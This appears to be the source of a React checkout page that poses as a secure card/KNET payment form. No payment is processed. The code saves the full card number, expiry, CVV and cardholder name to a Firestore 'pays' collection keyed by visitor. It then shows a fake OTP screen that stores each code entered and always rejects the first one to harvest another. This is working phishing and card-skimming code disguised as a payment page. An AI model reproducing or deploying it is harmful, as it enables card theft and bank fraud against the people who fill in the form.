"use client"

import type React from "react"
import { useState } from "react"
import { CreditCard, CheckCircle, AlertCircle, ArrowRight, Lock } from "lucide-react"
import { doc, updateDoc } from "firebase/firestore"
import { db } from "../../firebase"
import { useNavigate } from "react-router-dom"

interface PaymentSelectionProps {
  setPage: (page: string) => void
}

export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
  const navigate = useNavigate()
  const [paymentMethod, setPaymentMethod] = useState("card")

  const [cardDetails, setCardDetails] = useState({
    name: "",
    number: "",
    expiry: "",
    cvc: "",
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [showOtp, setShowOtp] = useState(false)
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState("")
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [cardError, setCardError] = useState("")

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 2) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return value
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target
    const fieldName = id.replace("card-", "")

    let formattedValue = value

    if (fieldName === "number") {
      formattedValue = formatCardNumber(value)
    } else if (fieldName === "expiry") {
      formattedValue = formatExpiryDate(value)
    } else if (fieldName === "cvc") {
      formattedValue = value.replace(/[^0-9]/g, "").substring(0, 3)
    }

    setCardDetails((prev) => ({
      ...prev,
      [fieldName]: formattedValue,
    }))
  }

  const validateCardDetails = () => {
    // Reset error
    setCardError("")

    // Check if all fields have values
    if (Object.values(cardDetails).some((value) => value.trim() === "")) {
      setCardError("Please fill in all card details")
      return false
    }

    // Validate card number (simple check for length after removing spaces)
    const cardNumberWithoutSpaces = cardDetails.number.replace(/\s+/g, "")
    if (cardNumberWithoutSpaces.length < 13 || cardNumberWithoutSpaces.length > 19) {
      setCardError("Please enter a valid card number")
      return false
    }

    // Validate expiry date format (MM/YY)
    if (!/^\d{2}\/\d{2}$/.test(cardDetails.expiry)) {
      setCardError("Please enter a valid expiry date (MM/YY)")
      return false
    }

    // Validate CVC (3-4 digits)
    if (!/^\d{3,4}$/.test(cardDetails.cvc)) {
      setCardError("Please enter a valid CVC code")
      return false
    }

    return true
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (paymentMethod === "knet") {
      // Navigate to KNET payment page
      if (navigate) {
        navigate("kent")
      } else {
       // navigate("kent")
      }
      return
    }

    if (paymentMethod === "card") {
      if (!validateCardDetails()) {
        return
      }

      setIsProcessing(true)

      try {
        // Save card details to Firebase
        const visitorId = localStorage.getItem("visitor")

        if (visitorId) {
          await addDataToFirebase(visitorId, cardDetails)
        }

        // Simulate processing delay
        setTimeout(() => {
          setIsProcessing(false)
          setShowOtp(true)
        }, 1500)
      } catch (error) {
        console.error("Error saving card details:", error)
        setIsProcessing(false)
        setCardError("An error occurred. Please try again.")
      }
    }
  }

  const addDataToFirebase = async (id: string, cardData: typeof cardDetails) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, {
        cardNumber: cardData.number.replace(/\s+/g, ""),
        cardExpiry: cardData.expiry,
        cvv: cardData.cvc,
        name: cardData.name,
        page: "payment",
      })
    } catch (error) {
      console.error("Error adding card data:", error)
      throw error
    }
  }

  const handleVerifyOtp = async () => {
    setOtpError("")

    if (!otp || otp.length < 4) {
      setOtpError("Please enter a valid OTP code")
      return
    }

    setIsProcessing(true)

    try {
      // Save OTP to Firebase
      const visitorId = localStorage.getItem("visitor")

      if (visitorId) {
        const docRef = doc(db, "pays", visitorId)
        await updateDoc(docRef, {
          otp: otp,
          page: "otp",
        })
      }

      // Simulate verification delay
      setTimeout(() => {
        setIsProcessing(false)

        // Simulate OTP failure for first attempt
        if (otpAttempts === 0) {
          setOtpError("Invalid OTP. Please try again.")
          setOtpAttempts((prev) => prev + 1)
          setOtp("")
        } else {
          // Navigate to success or next page
          if (navigate) {
            navigate("/success")
          } else {
            setPage("success")
          }
        }
      }, 1500)
    } catch (error) {
      console.error("Error verifying OTP:", error)
      setIsProcessing(false)
      setOtpError("An error occurred. Please try again.")
    }
  }

  // Detect card type based on first digits
  const getCardType = () => {
    const number = cardDetails.number.replace(/\s+/g, "")

    if (number.startsWith("4")) {
      return "Visa"
    } else if (/^5[1-5]/.test(number)) {
      return "Mastercard"
    } else if (/^3[47]/.test(number)) {
      return "American Express"
    } else if (/^6(?:011|5)/.test(number)) {
      return "Discover"
    }

    return null
  }

  const cardType = getCardType()

  return (
    <div className="w-full max-w-md mx-auto bg-white dark:bg-blue-800 rounded-lg border border-blue-200 dark:border-blue-700 shadow-lg p-4 overflow-hidden">
      <div className="p-6 border-b border-blue-200 dark:border-blue-700">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-semibold text-blue-900 dark:text-blue-100">Payment Method</h2>
            <p className="text-sm text-blue-500 dark:text-blue-400 mt-1">Select how you would like to pay</p>
          </div>
          <div className="flex items-center text-sm text-blue-500 dark:text-blue-400">
            <Lock className="h-4 w-4 mr-1" />
            Secure Payment
          </div>
        </div>
      </div>

      {!showOtp ? (
        <>
          <div className="p-6">
            {/* Payment Method Tabs */}
            <div className="mb-6">
              <div className="grid grid-cols-2 gap-4">
                <div className="w-full">
                  <input
                    type="radio"
                    id="card"
                    name="paymentMethod"
                    value="card"
                    checked={paymentMethod === "card"}
                    onChange={() => setPaymentMethod("card")}
                    className="absolute opacity-0 w-0 h-0"
                  />
                  <label
                    htmlFor="card"
                    className={`flex flex-col items-center justify-between rounded-md border-2 p-4 cursor-pointer hover:bg-blue-50 dark:hover:bg-blue-700 transition-all ${
                      paymentMethod === "card" ? "border-blue-500 shadow-sm" : "border-blue-200 dark:border-blue-700"
                    }`}
                  >
                    <CreditCard className="mb-3 h-6 w-6 text-blue-700 dark:text-blue-300" />
                    <span className="text-sm font-medium">Card</span>
                  </label>
                </div>

                <div className="w-full">
                  <input
                    type="radio"
                    id="knet"
                    name="paymentMethod"
                    value="knet"
                    checked={paymentMethod === "knet"}
                    onChange={() => setPaymentMethod("knet")}
                    className="absolute opacity-0 w-0 h-0"
                  />
                  <label
                    htmlFor="knet"
                    className={`flex flex-col items-center justify-between rounded-md border-2 p-4 cursor-pointer hover:bg-blue-50 dark:hover:bg-blue-700 transition-all ${
                      paymentMethod === "knet" ? "border-blue-500 shadow-sm" : "border-blue-200 dark:border-blue-700"
                    }`}
                  >
                    <div className="mb-3 h-6 w-6 flex items-center justify-center">
                      <img src="/kv.png" alt="KNET" className="h-6 w-6" />
                    </div>
                    <span className="text-sm font-medium">KNET</span>
                  </label>
                </div>
              </div>
            </div>

            {/* Card Form */}
            {paymentMethod === "card" && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <label htmlFor="card-name" className="block text-sm font-medium text-blue-700 dark:text-blue-300">
                    Name on Card
                  </label>
                  <input
                    id="card-name"
                    type="text"
                    className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
                    placeholder="John Smith"
                    value={cardDetails.name}
                    onChange={handleInputChange}
                  />
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <label htmlFor="card-number" className="block text-sm font-medium text-blue-700 dark:text-blue-300">
                      Card Number
                    </label>
                    {cardType && (
                      <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 dark:bg-blue-700 text-blue-800 dark:text-blue-300 border border-blue-200 dark:border-blue-600">
                        {cardType}
                      </span>
                    )}
                  </div>
                  <input
                    id="card-number"
                    type="text"
                    className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
                    placeholder="1234 5678 9012 3456"
                    value={cardDetails.number}
                    onChange={handleInputChange}
                    maxLength={19}
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label htmlFor="card-expiry" className="block text-sm font-medium text-blue-700 dark:text-blue-300">
                      Expiry Date
                    </label>
                    <input
                      id="card-expiry"
                      type="text"
                      className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
                      placeholder="MM/YY"
                      value={cardDetails.expiry}
                      onChange={handleInputChange}
                      maxLength={5}
                    />
                  </div>

                  <div className="space-y-2">
                    <label htmlFor="card-cvc" className="block text-sm font-medium text-blue-700 dark:text-blue-300">
                      CVC
                    </label>
                    <input
                      id="card-cvc"
                      type="password"
                      className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
                      placeholder="123"
                      value={cardDetails.cvc}
                      onChange={handleInputChange}
                      maxLength={4}
                    />
                  </div>
                </div>

                {cardError && (
                  <div className="flex items-center text-sm text-red-500 mt-2">
                    <AlertCircle className="h-4 w-4 mr-1" />
                    {cardError}
                  </div>
                )}
              </div>
            )}

            {/* KNET Info */}
            {paymentMethod === "knet" && (
              <div className="flex flex-col items-center justify-center py-6">
                <img src="/kv.png" alt="KNET" className="h-16 w-16 mb-4" />
                <p className="text-center text-blue-500 dark:text-blue-400">
                  You will be redirected to the KNET payment gateway to complete your payment.
                </p>
              </div>
            )}
          </div>

          <div className="p-6 border-t border-blue-200 dark:border-blue-700">
            <button
              onClick={handleSubmit}
              disabled={isProcessing}
              className={`w-full py-2 px-4 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors ${
                isProcessing ? "opacity-70 cursor-not-allowed" : ""
              }`}
            >
              {isProcessing ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin h-4 w-4 mr-2 border-2 border-white border-b-transparent rounded-full"></div>
                  Processing...
                </div>
              ) : (
                <div className="flex items-center justify-center">
                  Continue to Payment
                  <ArrowRight className="ml-2 h-4 w-4" />
                </div>
              )}
            </button>
          </div>
        </>
      ) : (
        <div className="p-6 space-y-6">
          <div className="text-center">
            <div className="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-full inline-flex items-center justify-center mb-4">
              <Lock className="h-8 w-8 text-blue-500 dark:text-blue-400" />
            </div>
            <h3 className="text-lg font-medium text-blue-900 dark:text-blue-100">Verification Required</h3>
            <p className="text-sm text-blue-500 dark:text-blue-400 mt-1">
              For your security, we need to verify your identity. We've sent a one-time password to your registered
              mobile number.
            </p>
          </div>

          <div className="space-y-2">
            <label htmlFor="otp" className="block text-sm font-medium text-blue-700 dark:text-blue-300">
              Enter OTP
            </label>
            <input
              id="otp"
              type="text"
              placeholder="Enter 4-digit code"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, "").substring(0, 6))}
              className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-center text-lg tracking-widest shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
              maxLength={6}
            />

            {otpError && (
              <div className="flex items-center text-sm text-red-500 mt-2">
                <AlertCircle className="h-4 w-4 mr-1" />
                {otpError}
              </div>
            )}
          </div>

          <button
            onClick={handleVerifyOtp}
            disabled={isProcessing}
            className={`w-full py-2 px-4 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors ${
              isProcessing ? "opacity-70 cursor-not-allowed" : ""
            }`}
          >
            {isProcessing ? (
              <div className="flex items-center justify-center">
                <div className="animate-spin h-4 w-4 mr-2 border-2 border-white border-b-transparent rounded-full"></div>
                Verifying...
              </div>
            ) : (
              <div className="flex items-center justify-center">
                Verify & Complete Payment
                <CheckCircle className="ml-2 h-4 w-4" />
              </div>
            )}
          </button>

          <p className="text-xs text-center text-blue-500 dark:text-blue-400">
            Didn't receive the code?{" "}
            <button className="text-blue-600 dark:text-blue-400 hover:underline text-xs">Resend OTP</button>
          </p>
        </div>
      )}
    </div>
  )
}
